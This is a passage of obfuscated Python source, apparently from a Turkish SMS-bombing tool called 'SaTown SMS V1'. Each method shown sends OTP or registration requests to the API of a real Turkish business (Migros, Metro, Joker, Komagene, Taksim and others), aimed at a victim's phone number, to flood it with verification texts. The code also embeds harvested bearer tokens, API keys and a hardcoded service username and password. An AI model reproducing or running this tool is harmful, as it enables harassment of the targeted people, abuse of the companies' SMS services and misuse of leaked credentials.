name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"#line:293
            OOO0OOO0O0O0000OO =requests .post (OO0O00OO0OO00OOO0 ,headers =O000O000OOOOOO0OO ,data =OO000O000O00O000O ,timeout =6 )#line:294
            if OOO0OOO0O0O0000OO .status_code ==202 :#line:295
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOO0OO000000OOOO0.phone} --> koton.com")#line:296
                OOO0OO000000OOOO0 .adet +=1 #line:297
            else :#line:298
                raise #line:299
        except :#line:300
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOO0OO000000OOOO0.phone} --> koton.com")#line:301
    def Hayatsu (O0OO0OOO0000OOO0O ):#line:305
        try :#line:306
            O0000O0OOOO0000O0 ="https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"#line:307
            OO00OOOOO00O000O0 ={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0","Accept":"application/json, text/javascript, */*; q=0.01","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Referer":"https://www.hayatsu.com.tr/","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM","Origin":"https://www.hayatsu.com.tr","Dnt":"1","Sec-Gpc":"1","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-site","Te":"trailers"}#line:308
            OO0O0OOO0OOO0O00O ={"mobilePhoneNumber":O0OO0OOO0000OOO0O .phone ,"actionType":"register"}#line:309
            O00O0O0000O0O00OO =requests .post (O0000O0OOOO0000O0 ,headers =OO00OOOOO00O000O0 ,data =OO0O0OOO0OOO0O00O ,timeout =6 )#line:310
            if O00O0O0000O0O00OO .json ()["is_success"]==True :#line:311
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0OO0OOO0000OOO0O.phone} --> api.hayatsu.com.tr")#line:312
                O0OO0OOO0000OOO0O .adet +=1 #line:313
            else :#line:314
                raise #line:315
        except :#line:316
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0OO0OOO0000OOO0O.phone} --> api.hayatsu.com.tr")#line:317
    def Hizliecza (O0OO0OO0000OOOOO0 ):#line:321
        try :#line:322
            O0OOO000O0000OOOO ="https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"#line:323
            OOO00OO000O0000O0 ={"Accept":"application/json","Content-Type":"application/json","Accept-Encoding":"gzip, deflate","User-Agent":"hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0","Accept-Language":"en-US,en;q=0.9","Authorization":"Bearer null"}#line:324
            O0O000O0O00O00OOO ={"otpOperationType":2 ,"phoneNumber":f"+90{O0OO0OO0000OOOOO0.phone}"}#line:325
            O0O0OOOO00O0OOO00 =requests .post (O0OOO000O0000OOOO ,headers =OOO00OO000O0000O0 ,json =O0O000O0O00O00OOO ,timeout =6 )#line:326
            if O0O0OOOO00O0OOO00 .json ()["isSuccess"]==True :#line:327
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0OO0OO0000OOOOO0.phone} --> hizlieczaprodapi.hizliecza.net")#line:328
                O0OO0OO0000OOOOO0 .adet +=1 #line:329
            else :#line:330
                raise #line:331
        except :#line:332
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0OO0OO0000OOOOO0.phone} --> hizlieczaprodapi.hizliecza.net")#line:333
    def Ipragaz (OOO0OOO0O00OO0O0O ):#line:337
        try :#line:338
            O0OOO0O0O0O000O00 ="https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"#line:339
            O0O00OOO000OOOO00 ={"Content-Type":"application/json","X-Api-Token":"","Authorization":"","App-Version":"1.3.9","App-Lang":"en","Accept":"*/*","App-Name":"ipragaz-mobile","Os":"ios","Accept-Language":"en-TR;q=1.0, tr-TR;q=0.9","Accept-Encoding":"gzip, deflate","User-Agent":"ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4","App-Build":"41","Os-Version":"15.7.7","Udid":"73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8","Connection":"close"}#line:340
            O0OOOO00OO0O0O0OO ={"birthDate":"2/7/2000","carPlate":"31 ABC 31","mobileOtp":"f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63","name":"Memati Bas","otp":"","phoneNumber":OOO0OOO0O00OO0O0O .phone ,"playerId":""}#line:341
            OOOOO0OO0OO00O0OO =requests .post (O0OOO0O0O0O000O00 ,headers =O0O00OOO000OOOO00 ,json =O0OOOO00OO0O0O0OO ,timeout =6 )#line:342
            if OOOOO0OO0OO00O0OO .status_code ==200 :#line:343
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOO0OOO0O00OO0O0O.phone} --> ipapp.ipragaz.com.tr")#line:344
                OOO0OOO0O00OO0O0O .adet +=1 #line:345
            else :#line:346
                raise #line:347
        except :#line:348
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOO0OOO0O00OO0O0O.phone} --> ipapp.ipragaz.com.tr")#line:349
    def Metro (OOOO000O00O0O0OO0 ):#line:353
        try :#line:354
            OO00O0OO0OOOOO00O ="https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"#line:355
            O000OO00OOOO000OO ={"Accept":"*/*","Content-Type":"application/json; charset=utf-8","Accept-Encoding":"gzip, deflate","Applicationversion":"2.1.1","Applicationplatform":"2","User-Agent":"Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1","Accept-Language":"en-TR;q=1.0, tr-TR;q=0.9","Connection":"close"}#line:356
            OOO0O0OOO000OOO0O ={"methodType":"2","mobilePhoneNumber":f"+90{OOOO000O00O0O0OO0.phone}"}#line:357
            OO000O000OOOOO0O0 =requests .post (OO00O0OO0OOOOO00O ,headers =O000OO00OOOO000OO ,json =OOO0O0OOO000OOO0O ,timeout =6 )#line:358
            if OO000O000OOOOO0O0 .json ()["status"]=="success":#line:359
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOOO000O00O0O0OO0.phone} --> feature.metro-tr.com")#line:360
                OOOO000O00O0O0OO0 .adet +=1 #line:361
            else :#line:362
                raise #line:363
        except :#line:364
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOOO000O00O0O0OO0.phone} --> feature.metro-tr.com")#line:365
    def Qumpara (OO000OO0OOO0OO0O0 ):#line:369
        try :#line:370
            O0O0O0O0000OO0OO0 ="https://tr-api.fisicek.com:443/v1.3/auth/getOTP"#line:371
            O00OOOO000O0OO0O0 ={"Accept":"application/json","Content-Type":"application/json","Accept-Encoding":"gzip, deflate","User-Agent":"qumpara/4.2.53 (iPhone; iOS 15.7.7; Scale/3.00)","Accept-Language":"en-TR;q=1, tr-TR;q=0.9"}#line:372
            O000000OO00O0O0OO ={"msisdn":f"+90{OO000OO0OOO0OO0O0.phone}"}#line:373
            OO00OOOOOO0OOOOOO =requests .post (O0O0O0O0000OO0OO0 ,headers =O00OOOO000O0OO0O0 ,json =O000000OO00O0O0OO ,timeout =6 )#line:374
            if OO00OOOOOO0OOOOOO .status_code ==200 :#line:375
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO000OO0OOO0OO0O0.phone} --> tr-api.fisicek.com")#line:376
                OO000OO0OOO0OO0O0 .adet +=1 #line:377
            else :#line:378
                raise #line:379
        except :#line:380
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO000OO0OOO0OO0O0.phone} --> tr-api.fisicek.com")#line:381
    def Paybol (O000O00OO0O00OO00 ):#line:385
        try :#line:386
            OO0O00OO00O000OO0 ="https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"#line:387
            OOOOO0O000000000O ={"Accept":"application/json","Content-Type":"application/json","User-Agent":"Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0","Accept-Language":"en-TR;q=1.0, tr-TR;q=0.9","Accept-Encoding":"gzip, deflate","Connection":"close"}#line:388
            OOOOOOOO000OOO0O0 ={"phone_number":f"90{O000O00OO0O00OO00.phone}"}#line:389
            O0OOOO0OO00OOOO0O =requests .post (OO0O00OO00O000OO0 ,headers =OOOOO0O000000000O ,json =OOOOOOOO000OOO0O0 ,timeout =6 )#line:390
            if O0OOOO0OO00OOOO0O .json ()["status"]==0 :#line:391
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O000O00OO0O00OO00.phone} --> pyb-mobileapi.walletgate.io")#line:392
                O000O00OO0O00OO00 .adet +=1 #line:393
            else :#line:394
                raise #line:395
        except :#line:396
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O000O00OO0O00OO00.phone} --> pyb-mobileapi.walletgate.io")#line:397
    def Migros (O0OOO0O0OO000000O ):#line:401
        try :#line:402
            O0000O0OO000OOOOO ="https://rest.migros.com.tr:443/sanalmarket/users/register/otp"#line:403
            OO0O0O000OOOOO00O ={"User-Agent":"Migros/1917 CFNetwork/1335.0.3.4 Darwin/21.6.0","X-Device-Model":"iPhone 31 Plus","X-Device-Type":"MOBILE","X-Device-App-Screen":"OTHER","X-Device-Language":"tr-TR","X-Device-App-Version":"10.6.13","X-Device-Current-Long":"","X-Request-Identifier":"FBE85947-6E31-49AC-AC8C-317B21D79E80","X-Device-Selected-Address-Lat":"","X-Device-Platform-Version":"15.8.0","X-Device-Current-Lat":"","X-Device-Platform":"IOS","X-Store-Ids":"","X-Device-Longitude":"","Accept-Language":"tr-TR,tr;q=0.9","Accept":"*/*","Content-Type":"application/json","X-Device-Latitude":"","Accept-Encoding":"gzip, deflate, br","X-Device-Selected-Address-Long":"","X-Device-Identifier":"31CAAD3F-5B53-315B-9C6D-31310D86826C"}#line:404
            OO00OO0O0OO0O00OO ={"email":O0OOO0O0OO000000O .mail ,"phoneNumber":O0OOO0O0OO000000O .phone }#line:405
            OOO00O000O0O00OO0 =requests .post (O0000O0OO000OOOOO ,headers =OO0O0O000OOOOO00O ,json =OO00OO0O0OO0O00OO ,timeout =6 )#line:406
            if OOO00O000O0O00OO0 .json ()["successful"]==True :#line:407
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0OOO0O0OO000000O.phone} --> rest.migros.com.tr")#line:408
                O0OOO0O0OO000000O .adet +=1 #line:409
            else :#line:410
                raise #line:411
        except :#line:412
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0OOO0O0OO000000O.phone} --> rest.migros.com.tr")#line:413
    def File (OOOOOO0O0O000OOO0 ):#line:417
        try :#line:418
            OO0OOO0OOO0OO000O ="https://api.filemarket.com.tr:443/v1/otp/send"#line:419
            OOO0O0OO0OO0O0O00 ={"Accept":"*/*","Content-Type":"application/json","User-Agent":"filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0","X-Os":"IOS","X-Version":"1.7","Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate"}#line:420
            O0O00OOOO0O0OO0O0 ={"mobilePhoneNumber":f"90{OOOOOO0O0O000OOO0.phone}"}#line:421
            O0OO0000O0000OO0O =requests .post (OO0OOO0OOO0OO000O ,headers =OOO0O0OO0OO0O0O00 ,json =O0O00OOOO0O0OO0O0 ,timeout =6 )#line:422
            if O0OO0000O0000OO0O .json ()["responseType"]=="SUCCESS":#line:423
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOOOOO0O0O000OOO0.phone} --> api.filemarket.com.tr")#line:424
                OOOOOO0O0O000OOO0 .adet +=1 #line:425
            else :#line:426
                raise #line:427
        except :#line:428
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOOOOO0O0O000OOO0.phone} --> api.filemarket.com.tr")#line:429
    def Joker (OO0OO0O00O0O00000 ):#line:433
        try :#line:434
            OO00OO00000000000 ="https://api.joker.com.tr:443/api/register"#line:435
            O0O00O0O0O0000O0O ={"Accept":"*/*","Content-Type":"application/json","Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds","Accept-Encoding":"gzip, deflate","User-Agent":"Joker/4.0.14 (com.joker.app; build:2; iOS 15.7.7) Alamofire/5.4.3","Accept-Language":"en-TR;q=1.0, tr-TR;q=0.9","Connection":"close"}#line:436
            OOOO0OO0000OOO000 ={"firstName":"Memati","gender":"m","iosVersion":"4.0.2","lastName":"Bas","os":"IOS","password":"31ABC..abc31","phoneNumber":f"0{OO0OO0O00O0O00000.phone}","username":OO0OO0O00O0O00000 .mail }#line:437
            OOO00OOOO0O0OO0OO =requests .post (OO00OO00000000000 ,headers =O0O00O0O0O0000O0O ,json =OOOO0OO0000OOO000 ,timeout =6 )#line:438
            if OOO00OOOO0O0OO0OO .json ()["message"]=="Doğrulama kodu gönderildi.":#line:439
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO0OO0O00O0O00000.phone} --> api.joker.com.tr")#line:440
                OO0OO0O00O0O00000 .adet +=1 #line:441
            else :#line:442
                raise #line:443
        except :#line:444
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO0OO0O00O0O00000.phone} --> api.joker.com.tr")#line:445
    def Akasya (OO0000OOOO0OOOOOO ):#line:449
        try :#line:450
            O00O000O0O0O00000 ="https://akasya-admin.poilabs.com:443/v1/tr/sms"#line:451
            O000000OOO0OOO000 ={"Accept":"*/*","Content-Type":"application/json","X-Platform-Token":"9f493307-d252-4053-8c96-62e7c90271f5","User-Agent":"Akasya","Accept-Language":"tr-TR;q=1.0, en-TR;q=0.9","Accept-Encoding":"gzip, deflate, br"}#line:452
            OO0O00OOO00O0O00O ={"phone":OO0000OOOO0OOOOOO .phone }#line:453
            OO0O000OO0OOO000O =requests .post (url =O00O000O0O0O00000 ,headers =O000000OOO0OOO000 ,json =OO0O00OOO00O0O00O ,timeout =6 )#line:454
            if OO0O000OO0OOO000O .json ()["result"]=="SMS sended succesfully!":#line:455
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO0000OOOO0OOOOOO.phone} --> akasya-admin.poilabs.com")#line:456
                OO0000OOOO0OOOOOO .adet +=1 #line:457
            else :#line:458
                raise #line:459
        except :#line:460
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO0000OOOO0OOOOOO.phone} --> akasya-admin.poilabs.com")#line:461
    def Akbati (O0OOO0OO00OO000O0 ):#line:465
        try :#line:466
            O00OOO0OO00O00000 ="https://akbati-admin.poilabs.com:443/v1/tr/sms"#line:467
            O00O0000OO0O00OOO ={"Accept":"*/*","Content-Type":"application/json","X-Platform-Token":"a2fe21af-b575-4cd7-ad9d-081177c239a3","User-Agent":"Akbat","Accept-Language":"tr-TR;q=1.0, en-TR;q=0.9","Accept-Encoding":"gzip, deflate, br"}#line:468
            OO00OO00OO0OO00O0 ={"phone":O0OOO0OO00OO000O0 .phone }#line:469
            OO0000OO0OO0O000O =requests .post (url =O00OOO0OO00O00000 ,headers =O00O0000OO0O00OOO ,json =OO00OO00OO0OO00O0 ,timeout =6 )#line:470
            if OO0000OO0OO0O000O .json ()["result"]=="SMS sended succesfully!":#line:471
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0OOO0OO00OO000O0.phone} --> akbati-admin.poilabs.com")#line:472
                O0OOO0OO00OO000O0 .adet +=1 #line:473
            else :#line:474
                raise #line:475
        except :#line:476
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0OOO0OO00OO000O0.phone} --> akbati-admin.poilabs.com")#line:477
    def Clickme (O0000O0000000OO0O ):#line:481
        try :#line:482
            OOO00OOO0O000OOO0 ="https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"#line:483
            OO0O0OOO00OOO000O ={"Content-Type":"application/json","Authorization":"apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc","Client-Version":"1.4.0","Client-Device":"IOS","Accept-Language":"tr-TR,tr;q=0.9","Accept-Encoding":"gzip, deflate, br","User-Agent":"ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"}#line:484
            OOOO0OOOOOO0OO0O0 ={"phone":O0000O0000000OO0O .phone }#line:485
            OO0OOOOOOOOOOO0O0 =requests .post (url =OOO00OOO0O000OOO0 ,json =OOOO0OOOOOO0OO0O0 ,headers =OO0O0OOO00OOO000O ,timeout =6 )#line:486
            if OO0OOOOOOOOOOO0O0 .json ()["isSuccess"]==True :#line:487
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0000O0000000OO0O.phone} --> mobile-gateway.clickmelive.com")#line:488
                O0000O0000000OO0O .adet +=1 #line:489
            else :#line:490
                raise #line:491
        except :#line:492
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0000O0000000OO0O.phone} --> mobile-gateway.clickmelive.com")#line:493
    def Happy (O00OOO00O0O000OO0 ):#line:497
        try :#line:498
            O00O0O000000OOO00 ="https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"#line:499
            OOO00O0000000OO0O ={"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate","Origin":"https://www.happy.com.tr","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)","Referer":"https://www.happy.com.tr/index.php?route=account/register"}#line:500
            OO0O0O00OO0000OOO ={"telephone":O00OOO00O0O000OO0 .phone }#line:501
            O0OO0000O0OO00OOO =requests .post (url =O00O0O000000OOO00 ,data =OO0O0O00OO0000OOO ,headers =OOO00O0000000OO0O ,timeout =6 )#line:502
            if O0OO0000O0OO00OOO .status_code ==200 :#line:503
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O00OOO00O0O000OO0.phone} --> happy.com.tr")#line:504
                O00OOO00O0O000OO0 .adet +=1 #line:505
            else :#line:506
                raise #line:507
        except :#line:508
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O00OOO00O0O000OO0.phone} --> happy.com.tr")#line:509
    def Komagene (OOOO000O0O00OOOOO ):#line:513
        try :#line:514
            O00OO0O0OO0O00O0O ="https://gateway.komagene.com.tr/auth/auth/smskodugonder"#line:515
            OOOO0OOO0OOO000O0 ={"Telefon":OOOO000O0O00OOOOO .phone ,"FirmaId":"32"}#line:516
            OO0O0OO00000OO00O ={"user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}#line:517
            O0O0O000000O00OOO =requests .post (url =O00OO0O0OO0O00O0O ,headers =OO0O0OO00000OO00O ,json =OOOO0OOO0OOO000O0 ,timeout =6 )#line:518
            if O0O0O000000O00OOO .json ()["Success"]==True :#line:519
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOOO000O0O00OOOOO.phone} --> gateway.komagene.com.tr")#line:520
                OOOO000O0O00OOOOO .adet +=1 #line:521
            else :#line:522
                raise #line:523
        except :#line:524
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOOO000O0O00OOOOO.phone} --> gateway.komagene.com.tr")#line:525
    def KuryemGelsin (O0OOO00OO00OOO0OO ):#line:529
        try :#line:530
            O000O00OO00000000 ="https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"#line:531
            OO00O0O0O0O00OO0O ={"phoneNumber":O0OOO00OO00OOO0OO .phone ,"phone_country_code":"+90"}#line:532
            OO0O0O0OO00OOOO00 =requests .post (url =O000O00OO00000000 ,json =OO00O0O0O0O00OO0O ,timeout =6 )#line:533
            if OO0O0O0OO00OOOO00 .status_code ==200 :#line:534
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0OOO00OO00OOO0OO.phone} --> api.kuryemgelsin.com")#line:535
                O0OOO00OO00OOO0OO .adet +=1 #line:536
            else :#line:537
                raise #line:538
        except :#line:539
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0OOO00OO00OOO0OO.phone} --> api.kuryemgelsin.com")#line:540
    def Porty (O0OO0O0OOO0O00OOO ):#line:544
        try :#line:545
            O0O0OO0O00OO00OOO ="https://panel.porty.tech:443/api.php?"#line:546
            O000OO00OO0OOOOO0 ={"Accept":"*/*","Content-Type":"application/json; charset=UTF-8","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9","User-Agent":"Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0","Token":"q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}#line:547
            OOO0OO000O0OO00O0 ={"job":"start_login","phone":O0OO0O0OOO0O00OOO .phone }#line:548
            OO0OOO0O0O00OO0O0 =requests .post (url =O0O0OO0O00OO00OOO ,json =OOO0OO000O0OO00O0 ,headers =O000OO00OO0OOOOO0 ,timeout =6 )#line:549
            if OO0OOO0O0O00OO0O0 .json ()["status"]=="success":#line:550
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0OO0O0OOO0O00OOO.phone} --> panel.porty.tech")#line:551
                O0OO0O0OOO0O00OOO .adet +=1 #line:552
            else :#line:553
                raise #line:554
        except :#line:555
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0OO0O0OOO0O00OOO.phone} --> panel.porty.tech")#line:556
    def Taksim (O0O0OO000O00O0O0O ):#line:560
        try :#line:561
            OOO0O00O00O0O0OO0 ="https://service.taksim.digital:443/services/PassengerRegister/Register"#line:562
            OO000OOO00000OO0O ={"Accept":"*/*","Content-Type":"application/json; charset=utf-8","Accept-Encoding":"gzip, deflate, br","Accept-Language":"tr-TR,tr;q=0.9","User-Agent":"TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0","Token":"gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}#line:563
            O0O000O0OOO0OOOOO ={"countryPhoneCode":"+90","name":"Memati","phoneNo":O0O0OO000O00O0O0O .phone ,"surname":"Bas"}#line:564
            O0000OO00000OO0O0 =requests .post (url =OOO0O00O00O0O0OO0 ,headers =OO000OOO00000OO0O ,json =O0O000O0OOO0OOOOO ,timeout =6 )#line:565
            if O0000OO00000OO0O0 .json ()["success"]==True :#line:566
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0O0OO000O00O0O0O.phone} --> service.taksim.digital")#line:567
                O0O0OO000O00O0O0O .adet +=1 #line:568
            else :#line:569
                raise #line:570
        except :#line:571
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0O0OO000O00O0O0O.phone} --> service.taksim.digital")#line:572
    def Tasdelen (OOO00OO0O0000O0O0 ):#line:576
        try :#line:577
            O00OOOO0OO0OO000O ="http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"#line:578
            O0O0O0O000O0O0O0O ={"PhoneNumber":OOO00OO0O0000O0O0 .phone ,"user":{"Password":"Aa123!35@1","UserName":"MobilOperator"}}#line:579
            OO0OO000O000O00OO =requests .post (url =O00OOOO0OO0OO000O ,json =O0O0O0O000O0O0O0O ,timeout =6 )#line:580
            if OO0OO000O000O00OO .json ()["Result"]==True :#line:581
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOO00OO0O0000O0O0.phone} --> 94.102.66.162:80")#line:582
                OOO00OO0O0000O0O0 .adet +=1 #line:583
            else :#line:584
                raise #line:585
        except :#line:586
